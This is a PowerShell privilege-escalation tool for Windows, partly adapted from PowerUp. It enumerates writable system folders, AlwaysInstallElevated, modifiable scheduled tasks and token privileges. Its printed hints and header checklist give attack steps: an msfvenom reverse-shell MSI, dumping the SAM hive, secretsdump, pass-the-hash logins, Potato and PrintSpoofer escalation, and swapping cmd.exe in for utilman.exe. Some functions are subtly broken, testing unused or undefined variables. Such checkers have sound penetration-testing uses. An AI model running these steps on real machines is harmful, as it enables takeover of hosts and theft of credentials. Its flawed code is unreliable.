# - [x] Scheduled task, the user can modify (from PowerUp)
# - [x] Default writable Folders
# - [x] AlwaysInstallElevated
# - [x] From local administrator to NT SYSTEM
# - Impersonation Privileges
#     - [x] SeBackup (Read sensitive files: SAM/SYSTEM/MEMORY.DMP)
#     - [x] SeAssignPrimaryToken (Allows a user to impersonate tokens and privesc to NT SYSTEM using tools as potato.exe/rottenpotato.exe/juicyportato.exe)
#     - SeCreateToken (Create arbitrary token including local admin rights with "NtCreateToken")
#     - SeDebug (Duplicate the "lsass.exe" token [https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1])
#     - SeLoadDriver (Can be used to load buggy drivers as szkg64.sys [CVE-2018-15732])
#     - SeRestore (Launch ISE.exe with SeRestore privileges, enabled "Enable-SeRestorePrivilege", Rename utilman.exe to utilman.old, Rename cmd.exe to utilman.exe, lock and press Win+U)
#     - SeTakeOwnership ('takeown.exe /f "%windir%\system32"' , 'icalcs.exe "%windir%\system32" /grant "%username%":F' , Rename cmd.exe to utilman.exe, lock and press Win+U )
#     - SeTcb (Manipulate tokens to have local admin rights included. May require SeImpersonate to be verified.)
#     - SeRelable (Allows you to own resources that have an integrity level even higher than your own [https://github.com/decoder-it/RelabelAbuse])
#     - [x] SeImpersonate (allows to impersonate any token, given that a handle to it can be obtained. Exploited with: juicy-potato/RogueWinRM/SweetPotato/PrintSpoofer)
# - Privileged File Write (usable only before 1903)
#     - WerTrigger (Exploit Privileged File Writes bugs with Windows Problem Reporting)
#         - Clone https://github.com/sailay1996/WerTrigger
#         - Copy phoneinfo.dll to C:\Windows\System32\
#         - Place Report.wer file and WerTrigger.exe in a same directory.
#         - Then, run WerTrigger.exe
#         - Enjoy a shell as NT AUTHORITY\SYSTEM
#     - WerMgr (Exploit Privileged Directory Creation Bugs with Windows Error Reporting)
#         - Clone https://github.com/binderlabs/DirCreate2System
#         - Create directory C:\Windows\System32\wermgr.exe.local\
#         - Grant access to it: cacls C:\Windows\System32\wermgr.exe.local /e /g everyone:f
#         - Place spawn.dll file and dircreate2system.exe in a same directory and run .\dircreate2system.exe
#         - Enjoy a shell as NT AUTHORITY\SYSTEM
# - Privileged File Delete
#     - During an MSI installation, the Windows Installer service maintains a record of every changes in case it needs to be rolled back, to do that it will create:
#         - a folder at C:\Config.msi containing
#             - a rollback script (.rbs)
#             - a rollback file (.rbf)
#     - [https://github.com/thezdi/PoC/tree/master/FilesystemEoPs/FolderOrFileDeleteToSystem]
#         - The exploit contains a .msi file with 2 actions, the first produces a delay and the second throws and error to make it rollback. The rollback will "restore" a malicious HID.dll in `C:\Program Files\Microsoft Shared\ink\HID.dll`
#         - Then switch to the secure desktop using: `[CTRL]+[ALT]+[DELETE]` and open the On-Screen Keyboard (osk.exe).
#         - osk.exe process first looks for the `C:\Program Files\Common Files\Microsoft\shared\ink\HID.dll` library instead of `C:\Windows\System32\HID.dll`

function Test-WritePermission {
    <#
    .EXAMPLES
        Test-WritePermission -Paths $pathsToCheck
    #>
    
    param (
        [string[]]$Paths
    )

    $pathsToCheck = @(
    "C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys",
    "C:\Windows\System32\spool\drivers\color",
    "C:\Windows\System32\spool\printers",
    "C:\Windows\System32\spool\servers",
    "C:\Windows\tracing",
    "C:\Windows\Temp",
    "C:\Users\Public",
    "C:\Windows\Tasks",
    "C:\Windows\System32\tasks",
    "C:\Windows\SysWOW64\tasks",
    "C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system",
    "C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system",
    "C:\Windows\debug\wia",
    "C:\Windows\registration\crmlog",
    "C:\Windows\System32\com\dmp",
    "C:\Windows\SysWOW64\com\dmp",
    "C:\Windows\System32\fxstmp",
    "C:\Windows\SysWOW64\fxstmp"
    )
    
    foreach ($path in $Paths) {
        if (Test-Path -Path $path) {
            try {
                $testFile = [System.IO.Path]::Combine($path, [System.IO.Path]::GetRandomFileName())
                $null = New-Item -Path $testFile -ItemType File -Force -ErrorAction Stop
                Remove-Item -Path $testFile -Force -ErrorAction Stop
                Write-Output $path
            } catch {
                # Do nothing, as we do not want to output paths with no write access
            }
        }
    }
}

function AlwaysInstallElevated {
    <#
    .DESCRIPTION
        Check for AlwaysInstallElevated. If activated, any user can install .msi.
    #>
    # Read registry values
    $hkcuPath = 'Registry::HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer'
    $hkcuValue = Get-RegistryValue -path $hkcuPath -name 'AlwaysInstallElevated'

    $hklmPath = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer'
    $hklmValue = Get-RegistryValue -path $hklmPath -name 'AlwaysInstallElevated'

    # Print out values
    Write-Output "HKCU = $hkcuValue"
    Write-Output "HKLM = $hklmValue"

    # If both are 1 = vulnerable
    if ($hkcuValue -eq 1 -and $hklmValue -eq 1) {
        Write-Host -ForegroundColor Green "[YES]" -NoNewline
        Write-Host " system is vulnerable to AlwaysInstallElevated."

        Write-Host ""
        Write-Host "Use: msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f msi > something.msi"
        Write-Host "Then Use: msiexec /quiet /qn /i something.msi"
        Write-Host "Remove it again: msiexec /q /n /uninstall something.msi"
    } else {
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " system is NOT vulnerable to AlwaysInstallElevated."
    }
}

function Get-ModifiableScheduledTaskFile {
<#
.SYNOPSIS

Returns scheduled tasks where the current user can modify any file
in the associated task action string.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-ModifiablePath  

.DESCRIPTION

Enumerates all scheduled tasks by recursively listing "$($ENV:windir)\System32\Tasks"
and parses the XML specification for each task, extracting the command triggers.
Each trigger string is filtered through Get-ModifiablePath, returning any file/config
locations in the found path strings that the current user can modify.

.EXAMPLE

Get-ModifiableScheduledTaskFile

Return scheduled tasks with modifiable command strings.

.OUTPUTS

PowerUp.ModifiableScheduledTaskFile

Custom PSObject containing results.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableScheduledTaskFile')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $Path = "$($ENV:windir)\System32\Tasks"

    # recursively enumerate all schtask .xmls
    Get-ChildItem -Path $Path -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
        try {
            $TaskName = $_.Name
            $TaskXML = [xml] (Get-Content $_.FullName)
            if ($TaskXML.Task.Triggers) {

                $TaskTrigger = $TaskXML.Task.Triggers.OuterXML

                # check schtask command
                $TaskXML.Task.Actions.Exec.Command | Get-ModifiablePath | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                    $Out | Add-Member Aliasproperty Name TaskName
                    $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableScheduledTaskFile')
                    $Out
                }

                # check schtask arguments
                $TaskXML.Task.Actions.Exec.Arguments | Get-ModifiablePath | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                    $Out | Add-Member Aliasproperty Name TaskName
                    $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableScheduledTaskFile')
                    $Out
                }
            }
        }
        catch {
            Write-Verbose "Error: $_"
        }
    }
    $ErrorActionPreference = $OrigError
}

function SeBackUpPrivilege {
    <#
    .DESCRIPTION
        The SeBackupPrivilege is a Windows privilege that provides a user or process with the ability to read files and directories, regardless of the security settings on those objects. 
        This privilege can be used by certain backup programs or processes that require the capability to back up or copy files that would not normally be accessible to the user.
    #>
    
    $userInformation = whoami /priv
    if($userInformation -like "*SeBackUpPrivilege*") {
        Write-Host -ForegroundColor Green "[YES]" -NoNewline
        Write-Host " SeBackUpPrivilege for current account found. Check if enabled."
        $userInformation -split "`n" | Where-Object {$_ -like "*SeBackUpPrivilege*"} | ForEach-Object {Write-Host $_}

        Write-Host ""
        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " Use: mkdir C:\temp ; reg save hklm\sam C:\temp\sam.hive ; reg save hklm\system C:\temp\system.hive"
        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " Or Use: impacket-secretsdump -sam sam.hive -system system.hive LOCAL"
        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " Then: evil-winrm -i <ip> -u 'Administrator' -H '<hash>'"
    } else {
        Write-Host -ForegroundColor Red "[NO]" -NoNewline
        Write-Host " No SeBackUpPrivilege for current account found."
    }
}

function SeImpersonatePrivilege {
    <#
    .DESCRIPTION
        The SeImpersonatePrivilege is a Windows privilege that grants a user or process the ability to impersonate the security context of another user or account. 
        This privilege allows a process to assume the identity of a different user, enabling it to perform actions or access resources as if it were that user.
    #>

    $userInformation = whoami /priv
    if($userInformation -like "*SeImpersonatePrivilege*") {
        Write-Host -ForegroundColor Green "[YES]" -NoNewline
        Write-Host " SeImpersonatePrivilege for current account found. Check if enabled."
        $userInformation -split "`n" | Where-Object {$_ -like "*SeImpersonatePrivilege*"} | ForEach-Object {Write-Host $_}

        Write-Host ""
        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " Use: https://github.com/itm4n/PrintSpoofer => PrintSpoofer64.exe -i -c cmd"

        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " OR Use: crackmapexec smb -u USERNAME -p PASSWORD -M impersonate"
    } else {
        Write-Host -ForegroundColor Red "[NO]" -NoNewline
        Write-Host " No SeImpersonatePrivilege for current account found."
    }
}

function SeAssignPrimaryToken {
    <#
    .DESCRIPTION
        The SeAssignPrimaryToken allows a user to impersonate tokens and privesc to NT SYSTEM using tools like potato.exe/rottenpotato.exe/juicyportato.exe.
    #>

    $userInformation = whoami /priv
    if($userInformation -like "*SeAssignPrimaryToken*") {
        Write-Host -ForegroundColor Green "[YES]" -NoNewline
        Write-Host " SeAssignPrimaryToken for current account found. Check if enabled."
        $userInformation -split "`n" | Where-Object {$_ -like "*SeAssignPrimaryToken*"} | ForEach-Object {Write-Host $_}

        Write-Host ""
        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " Use: https://github.com/micahvandeusen/GenericPotato => \GenericPotato.exe -m=AUTO -p=cmd.exe"
    } else {
        Write-Host -ForegroundColor Red "[NO]" -NoNewline
        Write-Host " No SeAssignPrimaryToken for current account found."
    }
}

function FromLocalAdminToNTSYSTEM {
    $currentUser = whoami

    # fetch current computer language
    $OSInfo = Get-WmiObject -Class Win32_OperatingSystem
    $languagepack = $OSInfo.MUILanguages
    if($languagepack -eq "de-DE") {
        $currentAdminGroupUser = Get-LocalGroup -Name "Administratoren"
    } elseif ($languagepack -eq "en-EN") {
        $currentAdminGroupUser = Get-LocalGroup -Name "Administrators"
    } else {
        Write-Host -ForegroundColor Red "[x]" -NoNewline
        Write-Host " No supported langugage detected."   
    }


    if ($adminGroupMembers -contains $currentUser) { 
        Write-Host -ForegroundColor GREEN "[YES]" -NoNewline
        Write-Host " Current user is part of local admin group."
        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " Use: PsExec.exe -i -s cmd.exe"
    } else {
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " Current user is not part of local admin group."
    }
}
